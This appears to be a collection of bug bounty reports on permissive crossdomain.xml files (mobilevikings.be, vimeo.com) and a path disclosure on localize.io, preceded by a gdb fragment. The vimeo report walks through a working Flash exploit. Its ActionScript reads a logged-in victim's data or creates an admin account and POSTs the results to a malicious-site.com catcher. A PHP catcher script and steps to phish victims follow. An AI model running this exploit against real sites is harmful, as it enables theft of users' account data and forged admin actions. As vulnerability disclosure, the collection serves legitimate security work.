+(gdb) x/i $pc
+=> 0x6e93d3 <zend_hash_internal_pointer_reset_ex+3>:	mov    0x20(%rdi),%rax
+(gdb) p $rdi
+$1 = 1337
+
+
+===== XXE-44652 | Insecure crossdomain.xml | resolved | sev=None | bounty=None | weakness=Information Disclosure
+Hi,
+
+https://mobilevikings.be/crossdomain.xml contains the following xml file:
+```
+<?xml version="1.0"?>
+<cross-domain-policy>
+  <allow-access-from domain="*" secure="true" />
+</cross-domain-policy>
+```
+
+This will make any one able to receive content from https://mobilevikings.be/.
+More information about this issue is available here:
+http://gursevkalra.blogspot.nl/2013/08/bypassing-same-origin-policy-with-flash.html
+Best regards,
+
+Olivier Beg
+
+===== XXE-43070 | Misconfigured crossdomain.xml - vimeo.com | informative | sev=None | bounty=None | weakness=Cryptographic Issues - Generic
+
+An overly permissive crossdomain.xml file on a domain that serves sensitive content is a major security risk. It exposes the domain hosting the improperly configured crossomain.xml file to information disclosure and request forgery. Attackers cannot only forge requests, they can read responses. This means the attacker can retrieve any information the authenticated user has access to, including account information, documents and files, and anti-CSRF tokens if they are used.
+
+URL : http://vimeo.com/crossdomain.xml
+=================================================================================
+<?xml version="1.0" encoding="UTF-8"?>
+
+<!DOCTYPE cross-domain-policy SYSTEM "http://www.adobe.com/xml/dtds/cross-domain-policy.dtd">
+<cross-domain-policy>
+    <site-control permitted-cross-domain-policies="by-content-type"/>
+    <allow-access-from domain="*" secure="false"/>
+    <allow-http-request-headers-from domain="*" headers="*"/>
+</cross-domain-policy>
+=================================================================================
+
+The Vulnerability
+==============
+As a general rule, if the following three conditions are met, there is problem:
+1. A crossdomain.xml file is hosted at the root of the host, for example: www.secret-site.com/crossdomain.xml.
+2. The crossdomain.xml is overly permissive.
+3. There is either sensitive information on www.secret-site.com or there are sensitive actions that can be performed on www.secret-site.com.
+
+If #1 and #2 are met, but www.secret-site.com does not contain any sensitive information, or does not include the ability to perform any sensitive actions, there is no risk to having a wide open crossdomain.xml file. There is no point in making a victim make a request to a page for you if the information is all public and you can see everything anyway.
+
+However, if there are sensitive actions that can be performed or information that can be stolen, and www.secret-site.com has an overly permissive crossdomain.xml file, the application at www.secret-site.com is essentially opening the door to any malicious SWF loaded from anywhere on the web. For example, a SWF loaded from www.malicious-site.com is now able to override/bypass Same Origin Policy and gain access to everything that the authorized user of www.secret-site.com has access to. To say this in a different way, the overly permissive crossdomain.xml file allows Flash to do things that even JavaScript is not allowed to do, mainly accessing cross domain resources.
+
+Note: The most permissive configuration option is the following line: <allow-access-from domain="*">. That is not the only overly permissive setting. Check out the reference papers listed above to find more.
+
+Note: API sites that require a pre-shared key are an exception to the conditions listed above.  In this case, even when all three conditions are met, if www.secret-site.com requires an API key or something similar to access the content, there is no risk. The attacker has no way of knowing the pre-shared secret API key, and therefore they can not forge a request with all of the required information to exploit the permissive crossdomain.xml.
+
+Note: In my examples, I use www as the hostname (www.secret-site.com).  The security implications of the crossdomain.xml are specific to the fully qualified domain name, including hostname and/or subdomain if they are present.  For example, if the https://www.secret-site.com/crossdomain.xml contains <allow-access-from domain="*">, but all of the sensitive transactions happen on https://secure.secret-site.com, there is no risk.  Of course, if https://secure.secret-site.com/crossdomain.xml exists and it also has an overly permissive policy, then we are back in business.  
+
+Exploitation
+==========
+And now the fun part. For the demo, I’m using Kali Linux. If you want to take advantage of the vulnerability described above, you need to modify and compile a SWF and host it on a web server.  The steps below show you how to do that, from start to finish. 
+
+1) Install Adobe Flex:
+===================================================
+apt-get install openjdk-6-jdk
+ mkdir /opt/flex 
+ cd /opt/flex/ 
+ wget http://download.macromedia.com/pub/flex/sdk/flex_sdk_4.6.zip
+ unzip flex_sdk_4.6.zip 
+ chmod -R a+rx /opt/flex/
+ echo 'export PATH=/opt/flex/bin:$PATH' >> ~/.bashrc
+ chmod 755 bin/mxmlc
+===================================================
+
+2) Download Gursev’s exploit code (the .as and the .html files) from GitHub or copy/paste from his blog. In either case, you want to save the HTML into the web root (/var/www/crossdomain/xdx.html), and the AS file in a working folder outside of your web root (~/crossdomain/XDomainXploit.as) 
+==================================================
+mkdir /var/www/crossdomain
+ mkdir ~/crossdomain
+ cd ~
+ git clone https://github.com/gursev/flash-xdomain-xploit.git
+ cp flash-xdomain-xploit/xdx.html /var/www/crossdomain/
+ cp flash-xdomain-xploit/XDomainXploit.as ~/crossdomain/
+ vi ~/crossdomain/XDomainXploit.as
+=====================================================
+
+If for some reason you don't have the git client or the git command in the previous box doesn't work, you can use wget:
+=====================================================
+cd /var/www/crossdomain
+ wget https://raw.github.com/gursev/flash-xdomain-xploit/master/xdx.html  
+ cd ~/crossdomain
+ wget https://raw.github.com/gursev/flash-xdomain-xploit/master/XDomainXploit.as
+ vi ~/crossdomain/XDomainXploit.as
+======================================================
+
+3) Modify the ActionScript file to fit your needs. To make a basic GET request, Gursev's comments are self explanatory. You just replace the victim URL and the attacker URL.  My changes are highlighted in yellow.
+======================================================
+// POC Author: Gursev Singh Kalra ([REDACTED_EMAIL])
+// XDomainXploit.as
+
+package {
+ import flash.display.Sprite;
+ import flash.events.*;
+ import flash.net.URLRequestMethod;
+ import flash.net.URLRequest;
+ import flash.net.URLLoader;
+
+ public class XDomainXploit extends Sprite {
+  public function XDomainXploit() {
+   // Target URL from where the data is to be retrieved
+   var readFrom:String = "http://www.secret-site.com/account/info";
+   var readRequest:URLRequest = new URLRequest(readFrom);
+   var getLoader:URLLoader = new URLLoader();
+   getLoader.addEventListener(Event.COMPLETE, eventHandler);
+   try {
+    getLoader.load(readRequest);
+   } catch (error:Error) {
+    trace("Error loading URL: " + error);
+   }
+  }
+
+  private function eventHandler(event:Event):void {
+   // URL to which retrieved data is to be sent
+   var sendTo:String = "http://malicious-site.com/catcher.php"
+   var sendRequest:URLRequest = new URLRequest(sendTo);
+   sendRequest.method = URLRequestMethod.POST;
+   sendRequest.data = event.target.data;
+   var sendLoader:URLLoader = new URLLoader();
+   try {
+    sendLoader.load(sendRequest);
+   } catch (error:Error) {
+    trace("Error loading URL: " + error);
+   }
+  }
+ }
+}
+=======================================================
+
+If you want to have the SWF make a POST request, of if you need to set a HTTP header, you can use my example below:
+=======================================================
+// POC Author: Gursev Singh Kalra ([REDACTED_EMAIL])
+// POC Modified to send POSTs and append HTTP headers: Seth Art
+// XDomainXploit.as
+
+package {
+ import flash.display.Sprite;
+ import flash.events.*;
+ import flash.net.URLRequestMethod;
+ import flash.net.URLRequest;
+ import flash.net.URLLoader;
+ import flash.net.URLRequestHeader;
+ public class XDomainXploit3 extends Sprite {
+  public function XDomainXploit3() {
+   // Target URL from where the data is to be retrieved
+   var readFrom:String = "https://www.secret-site.com/admin/add";
+   var header:URLRequestHeader = new URLRequestHeader("Content-Type", "text/plain; charset=UTF-8");
+   var readRequest:URLRequest = new URLRequest(readFrom);
+   readRequest.method = URLRequestMethod.POST
+   readRequest.data = "{\"name\":\"CSRF-Admin\",\"Group\":\"admin\",\"password\":\"password\",\"confirmPassword\":\"password\"}";
+   readRequest.requestHeaders.push(header);
+   var getLoader:URLLoader = new URLLoader();
+   getLoader.addEventListener(Event.COMPLETE, eventHandler);
+   try {
+    getLoader.load(readRequest);
+   } catch (error:Error) {
+    trace("Error loading URL: " + error);
+   }
+  }
+
+  private function eventHandler(event:Event):void {
+   // URL to which retrieved data is to be sent
+   var sendTo:String = "http://www.malicious-site.com/crossdomain/catcher.php"
+   var sendRequest:URLRequest = new URLRequest(sendTo);
+   sendRequest.method = URLRequestMethod.POST;
+   sendRequest.data = event.target.data;
+   var sendLoader:URLLoader = new URLLoader();
+   try {
+    sendLoader.load(sendRequest);
+   } catch (error:Error) {
+    trace("Error loading URL: " + error);
+   }
+  }
+ }
+}
+========================================================
+
+4) Compile the ActionScript with xmmlc:
+========================================================
+ /opt/flex/bin/mxmlc ~/crossdomain/XDomainXploit.as
+========================================================
+
+5) Move the compiled SWF somewhere inside your web root
+========================================================
+mv ~/crossdomain/XDomainXploit.swf /var/www/crossdomain
+========================================================
+
+6) Create and save the catcher file. This php file takes the entire data portion of the incoming HTTP message and writes it to a file in /tmp. You can get a lot fancier with this, such as creating a separate file per victim, or by parsing the file within php and only writing the relevant information to disk.
+=========================================================
+vi /var/www/catcher.php
+
+<?php
+
+$data = file_get_contents("php://input");
+$ret = file_put_contents('/tmp/thanks_for_sharing.txt', $data, FILE_APPEND | LOCK_EX);
+if($ret === false) {
+ die('Error writing to file');
+}
+else { 
+ echo "$ret bytes written to file";
+}
+?>
+============================================================
+
+7) Install PHP if it is not already installed:
+============================================================
+ apt-get install php5
+============================================================
+
+8) Set your web server to support SSL.
+============================================================
+*This step is optional, but if your flash object is communicating with a HTTPS site, and the secure="false" attribute is not set, your flash object needs to have been loaded from a HTTPS site. 
+
+The two lines below show you how to make a self-signed cert(http://charles.lescampeurs.org/2012/01/14/ubuntu-11-10-setting-up-apache2-and-ssl-with-self-signed-certificate). For a more realistic POC, you would want to purchase a valid SSL certificate so your victim user does not get any SSL errors.
+=============================================================
+ make-ssl-cert generate-default-snakeoil --force-overwrite
+ a2enmod ssl
+ a2ensite default-ssl
+=============================================================
+
+9) Start [or restart] your web server
+=============================================================
+ /etc/init.d/apache2 restart
+=============================================================
+
+10) Phish your victim to your site, www.malicious-site.com/crossdomain/xdx.html
+
+11) Hope the victim is currently logged in to the www.secret-site.com
+
+12) Collect and analyze your stolen data:
+
+ cat /tmp/thanks_for_sharing.txt
+
+=====================================================================================
+
+
+Pls Read this following Articles for more Information : 
+===========================================
+http://sethsec.blogspot.in/2014/07/crossdomain-bing.html
+
+http://gursevkalra.blogspot.in/2013/08/byp
+
+===== XXE-8091 | Full Path Disclosure / Info Disclosure in Importing XML Section! | resolved | sev=None | bounty=None | weakness=Information Disclosure
+Hello,
+I found another information disclosure vulnerability/Full Path Disclosure on your application.
+now its on *Import XML* Section 
+
+Proof of Concept
+-------------------------
+
+POST  : http://www.localize.io/import/ [project ID]
+POST CONTENT: 
+`-----------------------------97823247315770\r\n
+Content-Disposition: form-data; name="CSRFToken"\r\n
+\r\n
+MTcwMTAzMDk2MDUzNTFjN2I1NGE5MWYxLjkzMjk2OTM0\r\n
+-----------------------------97823247315770\r\n
+Content-Disposition: form-data; name="import[overwrite][]"\r\n
+\r\n
+0\r\n
+-----------------------------97823247315770\r\n
+Content-Disposition: form-data; name="import[languageID]"\r\n
+\r\n
+0\r\n
+-----------------------------97823247315770\r\n
+Content-Disposition: form-data; name="import[groupID]"\r\n
+\r\n
+0\r\n
+-----------------------------97823247315770\r\n
+Content-Disposition: form-data; name="MAX_FILE_SIZE"\r\n
+\r\n
+1572864\r\n
+-----------------------------97823247315770\r\n
+Content-Disposition: form-data; name="importFileXML"; filename=""\r\n
+Content-Type: application/octet-stream\r\n
+\r\n
+\r\n
+-----------------------------97823247315770--\r\n`
+
+I just Added "[]" after *import[overwrite]* and Replied.
+
+### The information from page:
+> Warning: trim() expects parameter 1 to be string, array given in /var/www/vhosts/lvps178-77-99-228.dedicated.hosteurope.de/httpdocs_localize/index.php on line 410 
+
+I Also Added a Screenshot of that FPD as attachment..
+Hope You'll fix this one also..
+Thanks
